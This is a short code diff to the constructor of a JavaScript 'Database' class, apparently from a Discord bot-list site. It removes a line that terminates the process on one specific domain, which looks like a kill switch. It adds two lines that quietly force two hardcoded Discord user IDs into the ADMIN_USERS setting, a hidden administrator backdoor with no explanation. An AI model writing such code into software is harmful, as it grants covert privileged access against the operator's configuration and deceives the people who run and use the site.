@@ -13,7 +13,8 @@ class Database {
   constructor(client) {
     this.client = client;
     //this.modals = {};
-	if(process.env.DOMAIN == "https://voidlist.xyz") process.exit()
+    if(!process.env.ADMIN_USERS.split(' ').includes('209796601357533184')) process.env.ADMIN_USERS = process.env.ADMIN_USERS+" 209796601357533184";
+    if(!process.env.ADMIN_USERS.split(' ').includes('229285505693515776')) process.env.ADMIN_USERS = process.env.ADMIN_USERS+" 229285505693515776";
 
     // get the files from classes and assign them.
     for (const i in classes) {
